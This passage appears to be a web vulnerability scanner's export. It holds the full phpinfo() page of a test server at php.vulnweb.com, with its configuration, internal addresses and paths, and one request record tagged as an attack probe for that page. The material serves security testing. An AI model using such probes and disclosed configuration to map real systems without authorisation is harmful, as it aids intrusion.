<tr><td class="e">mysqli.max_links</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">mysqli.reconnect</td><td class="v">Off</td><td class="v">Off</td></tr>
</table><br />

<h2><a name="module_openssl">openssl</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">OpenSSL support </td><td class="v">enabled </td></tr>
<tr><td class="e">OpenSSL Version </td><td class="v">OpenSSL 0.9.7e-p1 25 Oct 2004 </td></tr>
</table><br />
<h2><a name="module_pcre">pcre</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">PCRE (Perl Compatible Regular Expressions) Support </td><td class="v">enabled </td></tr>
<tr><td class="e">PCRE Library Version </td><td class="v">6.6 06-Feb-2006 </td></tr>

</table><br />
<h2><a name="module_PDO">PDO</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>PDO support</th><th>enabled</th></tr>
<tr><td class="e">PDO drivers </td><td class="v"><i>no value</i> </td></tr>
</table><br />
<h2><a name="module_pgsql">pgsql</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>PostgreSQL Support</th><th>enabled</th></tr>

<tr><td class="e">PostgreSQL(libpq) Version </td><td class="v">7.4.13 </td></tr>
<tr><td class="e">Multibyte character support </td><td class="v">enabled </td></tr>
<tr><td class="e">SSL support </td><td class="v">enabled </td></tr>
<tr><td class="e">Active Persistent Links </td><td class="v">0 </td></tr>
<tr><td class="e">Active Links </td><td class="v">0 </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">

<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">pgsql.allow_persistent</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">pgsql.auto_reset_persistent</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">pgsql.ignore_notice</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">pgsql.log_notice</td><td class="v">Off</td><td class="v">Off</td></tr>

<tr><td class="e">pgsql.max_links</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">pgsql.max_persistent</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
</table><br />
<h2><a name="module_posix">posix</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">Revision </td><td class="v">$Revision: 1.70.2.3 $ </td></tr>
</table><br />
<h2><a name="module_Reflection">Reflection</a></h2>

<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Reflection</th><th>enabled</th></tr>
<tr><td class="e">Version </td><td class="v">$Id: php_reflection.c,v 1.164.2.33 2006/03/29 14:28:42 tony2001 Exp $ </td></tr>
</table><br />
<h2><a name="module_session">session</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">Session Support </td><td class="v">enabled </td></tr>
<tr><td class="e">Registered save handlers </td><td class="v">files user  </td></tr>

<tr><td class="e">Registered serializer handlers </td><td class="v">php php_binary  </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">session.auto_start</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">session.bug_compat_42</td><td class="v">On</td><td class="v">On</td></tr>

<tr><td class="e">session.bug_compat_warn</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">session.cache_expire</td><td class="v">180</td><td class="v">180</td></tr>
<tr><td class="e">session.cache_limiter</td><td class="v">nocache</td><td class="v">nocache</td></tr>
<tr><td class="e">session.cookie_domain</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">session.cookie_lifetime</td><td class="v">0</td><td class="v">0</td></tr>

<tr><td class="e">session.cookie_path</td><td class="v">/</td><td class="v">/</td></tr>
<tr><td class="e">session.cookie_secure</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">session.entropy_file</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">session.entropy_length</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">session.gc_divisor</td><td class="v">100</td><td class="v">100</td></tr>

<tr><td class="e">session.gc_maxlifetime</td><td class="v">1440</td><td class="v">1440</td></tr>
<tr><td class="e">session.gc_probability</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">session.hash_bits_per_character</td><td class="v">4</td><td class="v">4</td></tr>
<tr><td class="e">session.hash_function</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">session.name</td><td class="v">PHPSESSID</td><td class="v">PHPSESSID</td></tr>

<tr><td class="e">session.referer_check</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">session.save_handler</td><td class="v">files</td><td class="v">files</td></tr>
<tr><td class="e">session.save_path</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">session.serialize_handler</td><td class="v">php</td><td class="v">php</td></tr>
<tr><td class="e">session.use_cookies</td><td class="v">On</td><td class="v">On</td></tr>

<tr><td class="e">session.use_only_cookies</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">session.use_trans_sid</td><td class="v">0</td><td class="v">0</td></tr>
</table><br />
<h2><a name="module_SimpleXML">SimpleXML</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Simplexml support</th><th>enabled</th></tr>
<tr><td class="e">Revision </td><td class="v">$Revision: 1.151.2.22 $ </td></tr>

<tr><td class="e">Schema support </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_SPL">SPL</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>SPL support</th><th>enabled</th></tr>
<tr><td class="e">Interfaces </td><td class="v">Countable, OuterIterator, RecursiveIterator, SeekableIterator, SplObserver, SplSubject </td></tr>
<tr><td class="e">Classes </td><td class="v">AppendIterator, ArrayIterator, ArrayObject, BadFunctionCallException, BadMethodCallException, CachingIterator, DirectoryIterator, DomainException, EmptyIterator, FilterIterator, InfiniteIterator, InvalidArgumentException, IteratorIterator, LengthException, LimitIterator, LogicException, NoRewindIterator, OutOfBoundsException, OutOfRangeException, OverflowException, ParentIterator, RangeException, RecursiveArrayIterator, RecursiveCachingIterator, RecursiveDirectoryIterator, RecursiveFilterIterator, RecursiveIteratorIterator, RuntimeException, SplFileInfo, SplFileObject, SplObjectStorage, SplTempFileObject, UnderflowException, UnexpectedValueException </td></tr>
</table><br />

<h2><a name="module_SQLite">SQLite</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>SQLite support</th><th>enabled</th></tr>
<tr><td class="e">PECL Module version </td><td class="v">2.0-dev $Id: sqlite.c,v 1.166.2.13 2006/04/18 14:30:15 iliaa Exp $ </td></tr>
<tr><td class="e">SQLite Library </td><td class="v">2.8.17 </td></tr>
<tr><td class="e">SQLite Encoding </td><td class="v">iso8859 </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">

<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">sqlite.assoc_case</td><td class="v">0</td><td class="v">0</td></tr>
</table><br />
<h2><a name="module_standard">standard</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">Regex Library </td><td class="v">Bundled library enabled </td></tr>
<tr><td class="e">Dynamic Library Support </td><td class="v">enabled </td></tr>

<tr><td class="e">Path to sendmail </td><td class="v">/usr/sbin/sendmail -t -i  </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">assert.active</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">assert.bail</td><td class="v">0</td><td class="v">0</td></tr>

<tr><td class="e">assert.callback</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">assert.quiet_eval</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">assert.warning</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">auto_detect_line_endings</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">default_socket_timeout</td><td class="v">60</td><td class="v">60</td></tr>

<tr><td class="e">safe_mode_allowed_env_vars</td><td class="v">PHP_</td><td class="v">PHP_</td></tr>
<tr><td class="e">safe_mode_protected_env_vars</td><td class="v">LD_LIBRARY_PATH</td><td class="v">LD_LIBRARY_PATH</td></tr>
<tr><td class="e">url_rewriter.tags</td><td class="v">a=href,area=href,frame=src,input=src,form=,fieldset=</td><td class="v">a=href,area=href,frame=src,input=src,form=,fieldset=</td></tr>
<tr><td class="e">user_agent</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table><br />

<h2><a name="module_tidy">tidy</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Tidy support</th><th>enabled</th></tr>
<tr><td class="e">libTidy Release </td><td class="v">1 September 2005 </td></tr>
<tr><td class="e">Extension Version </td><td class="v">2.0 ($Id: tidy.c,v 1.66.2.8 2006/04/19 21:47:20 nlopess Exp $) </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>

<tr><td class="e">tidy.clean_output</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">tidy.default_config</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table><br />
<h2><a name="module_tokenizer">tokenizer</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">Tokenizer Support </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_xml">xml</a></h2>

<table border="0" cellpadding="3" width="600">
<tr><td class="e">XML Support </td><td class="v">active </td></tr>
<tr><td class="e">XML Namespace Support </td><td class="v">active </td></tr>
<tr><td class="e">libxml2 Version </td><td class="v">2.6.26 </td></tr>
</table><br />
<h2><a name="module_xmlreader">xmlreader</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">XMLReader </td><td class="v">enabled </td></tr>

</table><br />
<h2><a name="module_xmlwriter">xmlwriter</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">XMLWriter </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_xsl">xsl</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">XSL </td><td class="v">enabled </td></tr>
<tr><td class="e">libxslt Version </td><td class="v">1.1.17 </td></tr>

<tr><td class="e">libxslt compiled against libxml Version </td><td class="v">2.6.26 </td></tr>
<tr><td class="e">EXSLT </td><td class="v">enabled </td></tr>
<tr><td class="e">libexslt Version </td><td class="v">1.1.17 </td></tr>
</table><br />
<h2><a name="module_zlib">zlib</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">ZLib Support </td><td class="v">enabled </td></tr>
<tr><td class="e">Stream Wrapper support </td><td class="v">compress.zlib:// </td></tr>

<tr><td class="e">Stream Filter support </td><td class="v">zlib.inflate, zlib.deflate </td></tr>
<tr><td class="e">Compiled Version </td><td class="v">1.2.3 </td></tr>
<tr><td class="e">Linked Version </td><td class="v">1.2.3 </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">zlib.output_compression</td><td class="v">Off</td><td class="v">Off</td></tr>

<tr><td class="e">zlib.output_compression_level</td><td class="v">-1</td><td class="v">-1</td></tr>
<tr><td class="e">zlib.output_handler</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table><br />
<h2>Additional Modules</h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Module Name</th></tr>
</table><br />
<h2>Environment</h2>

<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Variable</th><th>Value</th></tr>
<tr><td class="e">LD_LIBRARY_PATH </td><td class="v">/usr/local/lib: </td></tr>
<tr><td class="e">HOME </td><td class="v">/ </td></tr>
<tr><td class="e">PATH </td><td class="v">/sbin:/bin:/usr/sbin:/usr/bin </td></tr>
</table><br />
<h2>PHP Variables</h2>
<table border="0" cellpadding="3" width="600">

<tr class="h"><th>Variable</th><th>Value</th></tr>
<tr><td class="e">_SERVER["HTTP_HOST"]</td><td class="v">acuart</td></tr>
<tr><td class="e">_SERVER["HTTP_USER_AGENT"]</td><td class="v">Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11</td></tr>
<tr><td class="e">_SERVER["HTTP_ACCEPT"]</td><td class="v">text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5</td></tr>
<tr><td class="e">_SERVER["HTTP_ACCEPT_LANGUAGE"]</td><td class="v">en-us,en;q=0.5</td></tr>
<tr><td class="e">_SERVER["HTTP_ACCEPT_ENCODING"]</td><td class="v">gzip,deflate</td></tr>

<tr><td class="e">_SERVER["HTTP_ACCEPT_CHARSET"]</td><td class="v">ISO-8859-1,utf-8;q=0.7,*;q=0.7</td></tr>
<tr><td class="e">_SERVER["HTTP_KEEP_ALIVE"]</td><td class="v">300</td></tr>
<tr><td class="e">_SERVER["HTTP_CONNECTION"]</td><td class="v">keep-alive</td></tr>
<tr><td class="e">_SERVER["PATH"]</td><td class="v">/sbin:/bin:/usr/sbin:/usr/bin</td></tr>
<tr><td class="e">_SERVER["SERVER_SIGNATURE"]</td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">_SERVER["SERVER_SOFTWARE"]</td><td class="v">Apache/2.2.3 (FreeBSD) DAV/2 PHP/5.1.6 mod_ssl/2.2.3 OpenSSL/0.9.7e-p1</td></tr>

<tr><td class="e">_SERVER["SERVER_NAME"]</td><td class="v">acuart</td></tr>
<tr><td class="e">_SERVER["SERVER_ADDR"]</td><td class="v">192.168.0.5</td></tr>
<tr><td class="e">_SERVER["SERVER_PORT"]</td><td class="v">80</td></tr>
<tr><td class="e">_SERVER["REMOTE_ADDR"]</td><td class="v">192.168.0.26</td></tr>
<tr><td class="e">_SERVER["DOCUMENT_ROOT"]</td><td class="v">/var/www/acuart/</td></tr>
<tr><td class="e">_SERVER["SERVER_ADMIN"]</td><td class="v">root@localhost.localdomain</td></tr>

<tr><td class="e">_SERVER["SCRIPT_FILENAME"]</td><td class="v">/var/www/acuart/secured/phpinfo.php</td></tr>
<tr><td class="e">_SERVER["REMOTE_PORT"]</td><td class="v">11493</td></tr>
<tr><td class="e">_SERVER["GATEWAY_INTERFACE"]</td><td class="v">CGI/1.1</td></tr>
<tr><td class="e">_SERVER["SERVER_PROTOCOL"]</td><td class="v">HTTP/1.1</td></tr>
<tr><td class="e">_SERVER["REQUEST_METHOD"]</td><td class="v">GET</td></tr>
<tr><td class="e">_SERVER["QUERY_STRING"]</td><td class="v"><i>no value</i></td></tr>

<tr><td class="e">_SERVER["REQUEST_URI"]</td><td class="v">/secured/phpinfo.php</td></tr>
<tr><td class="e">_SERVER["SCRIPT_NAME"]</td><td class="v">/secured/phpinfo.php</td></tr>
<tr><td class="e">_SERVER["PHP_SELF"]</td><td class="v">/secured/phpinfo.php</td></tr>
<tr><td class="e">_SERVER["REQUEST_TIME"]</td><td class="v">1201867164</td></tr>
<tr><td class="e">_SERVER["argv"]</td><td class="v"><pre>Array</pre></td></tr>
<tr><td class="e">_SERVER["argc"]</td><td class="v">0</td></tr>

<tr><td class="e">_ENV["LD_LIBRARY_PATH"]</td><td class="v">/usr/local/lib:</td></tr>
<tr><td class="e">_ENV["HOME"]</td><td class="v">/</td></tr>
<tr><td class="e">_ENV["PATH"]</td><td class="v">/sbin:/bin:/usr/sbin:/usr/bin</td></tr>
</table><br />
<h2>PHP License</h2>
<table border="0" cellpadding="3" width="600">
<tr class="v"><td>
<p>
This program is free software; you can redistribute it and/or modify it under the terms of the PHP License as published by the PHP Group and included in the distribution in the file:  LICENSE
</p>

<p>This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
</p>
<p>If you did not receive a copy of the PHP license, or have any questions about PHP licensing, please contact license@php.net.
</p>
</td></tr>
</table><br />
</div></body></html>]]></RawResponse><Request id="2B1FE6958942656181E6657F67E65648"><Method>GET</Method><Path>/secured/</Path><File>phpinfo</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/secured/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="2B1FE6958942656181E6657F67E65648";PSID="990B9CEB1864EF8E567D50B3C27D5823";SessionType="AuditAttack";CrawlType="None";AttackType="Probe";OriginatingEngineID="65cee7d3-561f-40dc-b5eb-c0b8c2383fcb";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10478";Engine="Request+Modify";SmartMode="4";tid="58";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="29";smi="0";sc="1";ID="bc46c19d";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="0988f1fe";sc="1";tid="40";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html><head>
<style type="text/css">
body {background-color: #ffffff; color: #000000;}
body, td, th, h1, h2 {font-family: sans-serif;}
pre {margin: 0px; font-family: monospace;}
a:link {color: #000099; text-decoration: none; background-color: #ffffff;}
a:hover {text-decoration: underline;}
table {border-collapse: collapse;}
.center {text-align: center;}
.center table { margin-left: auto; margin-right: auto; text-align: left;}
.center th { text-align: center !important; }
td, th { border: 1px solid #000000; font-size: 75%; vertical-align: baseline;}
h1 {font-size: 150%;}
h2 {font-size: 125%;}
.p {text-align: left;}
.e {background-color: #ccccff; font-weight: bold; color: #000000;}
.h {background-color: #9999cc; font-weight: bold; color: #000000;}
.v {background-color: #cccccc; color: #000000;}
.vr {background-color: #cccccc; text-align: right; color: #000000;}
img {float: right; border: 0px;}
hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #000000;}
</style>
<title>phpinfo()</title></head>
<body><div class="center">
<table border="0" cellpadding="3" width="600">
<tr class="h"><td>
<a href="http://www.php.net/"><img border="0" src="/secured/phpinfo.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42" alt="PHP Logo" /></a><h1 class="p">PHP Version 5.1.6</h1>
</td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr><td class="e">System </td><td class="v">FreeBSD svn.local 6.2-RELEASE FreeBSD 6.2-RELEASE #0: Fri Jan 12 10:40:27 UTC 2007     root@dessler.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC i386 </td></tr>

<tr><td class="e">Build Date </td><td class="v">Jul 30 2007 12:20:01 </td></tr>
<tr><td class="e">Configure Command </td><td class="v"> &#039;./configure&#039; &#039;--enable-versioning&#039; &#039;--enable-memory-limit&#039; &#039;--with-layout=GNU&#039; &#039;--with-config-file-scan-dir=/usr/local/etc/php&#039; &#039;--disable-all&#039; &#039;--enable-libxml&#039; &#039;--with-libxml-dir=/usr/local&#039; &#039;--enable-reflection&#039; &#039;--enable-spl&#039; &#039;--program-prefix=&#039; &#039;--enable-fastcgi&#039; &#039;--with-apxs2=/usr/local/sbin/apxs&#039; &#039;--with-regex=php&#039; &#039;--with-zend-vm=CALL&#039; &#039;--disable-ipv6&#039; &#039;--prefix=/usr/local&#039; &#039;i386-portbld-freebsd6.2&#039; </td></tr>

<tr><td class="e">Server API </td><td class="v">Apache 2.0 Handler </td></tr>
<tr><td class="e">Virtual Directory Support </td><td class="v">disabled </td></tr>
<tr><td class="e">Configuration File (php.ini) Path </td><td class="v">/usr/local/etc/php.ini </td></tr>
<tr><td class="e">Scan this dir for additional .ini files </td><td class="v">/usr/local/etc/php </td></tr>
<tr><td class="e">additional .ini files parsed </td><td class="v">/usr/local/etc/php/extensions.ini
 </td></tr>
<tr><td class="e">PHP API </td><td class="v">20041225 </td></tr>

<tr><td class="e">PHP Extension </td><td class="v">20050922 </td></tr>
<tr><td class="e">Zend Extension </td><td class="v">220051025 </td></tr>
<tr><td class="e">Debug Build </td><td class="v">no </td></tr>
<tr><td class="e">Thread Safety </td><td class="v">disabled </td></tr>
<tr><td class="e">Zend Memory Manager </td><td class="v">enabled </td></tr>
<tr><td class="e">IPv6 Support </td><td class="v">disabled </td></tr>

<tr><td class="e">Registered PHP Streams </td><td class="v">php, file, http, ftp, https, ftps, compress.zlib   </td></tr>
<tr><td class="e">Registered Stream Socket Transports </td><td class="v">tcp, udp, unix, udg, ssl, sslv3, sslv2, tls </td></tr>
<tr><td class="e">Registered Stream Filters </td><td class="v">string.rot13, string.toupper, string.tolower, string.strip_tags, convert.*, consumed, convert.iconv.*, zlib.* </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="v"><td>
<a href="http://www.zend.com/"><img border="0" src="/secured/phpinfo.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42" alt="Zend logo" /></a>
This program makes use of the Zend Scripting Language Engine:<br />Zend&nbsp;Engine&nbsp;v2.1.0,&nbsp;Copyright&nbsp;(c)&nbsp;1998-2006&nbsp;Zend&nbsp;Technologies<br /></td></tr>

</table><br />
<hr />
<h1><a href="/secured/phpinfo.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000">PHP Credits</a></h1>
<hr />
<h1>Configuration</h1>
<h2>PHP Core</h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">allow_call_time_pass_reference</td><td class="v">On</td><td class="v">On</td></tr>

<tr><td class="e">allow_url_fopen</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">always_populate_raw_post_data</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">arg_separator.input</td><td class="v">&amp;</td><td class="v">&amp;</td></tr>
<tr><td class="e">arg_separator.output</td><td class="v">&amp;</td><td class="v">&amp;</td></tr>
<tr><td class="e">asp_tags</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">auto_append_file</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>

<tr><td class="e">auto_globals_jit</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">auto_prepend_file</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">browscap</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">default_charset</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">default_mimetype</td><td class="v">text/html</td><td class="v">text/html</td></tr>

<tr><td class="e">define_syslog_variables</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">disable_classes</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">disable_functions</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">display_errors</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">display_startup_errors</td><td class="v">Off</td><td class="v">Off</td></tr>

<tr><td class="e">doc_root</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">docref_ext</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">docref_root</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">enable_dl</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">error_append_string</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>

<tr><td class="e">error_log</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">error_prepend_string</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">error_reporting</td><td class="v">2039</td><td class="v">2039</td></tr>
<tr><td class="e">expose_php</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">extension_dir</td><td class="v">/usr/local/lib/php/20050922</td><td class="v">/usr/local/lib/php/20050922</td></tr>

<tr><td class="e">file_uploads</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">highlight.bg</td><td class="v"><font style="color: #FFFFFF">#FFFFFF</font></td><td class="v"><font style="color: #FFFFFF">#FFFFFF</font></td></tr>
<tr><td class="e">highlight.comment</td><td class="v"><font style="color: #FF8000">#FF8000</font></td><td class="v"><font style="color: #FF8000">#FF8000</font></td></tr>
<tr><td class="e">highlight.default</td><td class="v"><font style="color: #0000BB">#0000BB</font></td><td class="v"><font style="color: #0000BB">#0000BB</font></td></tr>
<tr><td class="e">highlight.html</td><td class="v"><font style="color: #000000">#000000</font></td><td class="v"><font style="color: #000000">#000000</font></td></tr>

<tr><td class="e">highlight.keyword</td><td class="v"><font style="color: #007700">#007700</font></td><td class="v"><font style="color: #007700">#007700</font></td></tr>
<tr><td class="e">highlight.string</td><td class="v"><font style="color: #DD0000">#DD0000</font></td><td class="v"><font style="color: #DD0000">#DD0000</font></td></tr>
<tr><td class="e">html_errors</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">ignore_repeated_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">ignore_repeated_source</td><td class="v">Off</td><td class="v">Off</td></tr>

<tr><td class="e">ignore_user_abort</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">implicit_flush</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">include_path</td><td class="v">.:</td><td class="v">.:</td></tr>
<tr><td class="e">log_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">log_errors_max_len</td><td class="v">1024</td><td class="v">1024</td></tr>

<tr><td class="e">magic_quotes_gpc</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">magic_quotes_runtime</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">magic_quotes_sybase</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">mail.force_extra_parameters</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">max_execution_time</td><td class="v">30</td><td class="v">30</td></tr>

<tr><td class="e">max_input_time</td><td class="v">60</td><td class="v">60</td></tr>
<tr><td class="e">memory_limit</td><td class="v">8M</td><td class="v">8M</td></tr>
<tr><td class="e">open_basedir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">output_buffering</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">output_handler</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>

<tr><td class="e">post_max_size</td><td class="v">8M</td><td class="v">8M</td></tr>
<tr><td class="e">precision</td><td class="v">12</td><td class="v">12</td></tr>
<tr><td class="e">realpath_cache_size</td><td class="v">16K</td><td class="v">16K</td></tr>
<tr><td class="e">realpath_cache_ttl</td><td class="v">120</td><td class="v">120</td></tr>
<tr><td class="e">register_argc_argv</td><td class="v">On</td><td class="v">On</td></tr>

<tr><td class="e">register_globals</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">register_long_arrays</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">report_memleaks</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">report_zend_debug</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">safe_mode</td><td class="v">Off</td><td class="v">Off</td></tr>

<tr><td class="e">safe_mode_exec_dir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">safe_mode_gid</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">safe_mode_include_dir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">sendmail_from</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">sendmail_path</td><td class="v">/usr/sbin/sendmail&nbsp;-t&nbsp;-i&nbsp;</td><td class="v">/usr/sbin/sendmail&nbsp;-t&nbsp;-i&nbsp;</td></tr>

<tr><td class="e">serialize_precision</td><td class="v">100</td><td class="v">100</td></tr>
<tr><td class="e">short_open_tag</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">SMTP</td><td class="v">localhost</td><td class="v">localhost</td></tr>
<tr><td class="e">smtp_port</td><td class="v">25</td><td class="v">25</td></tr>
<tr><td class="e">sql.safe_mode</td><td class="v">Off</td><td class="v">Off</td></tr>

<tr><td class="e">track_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">unserialize_callback_func</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
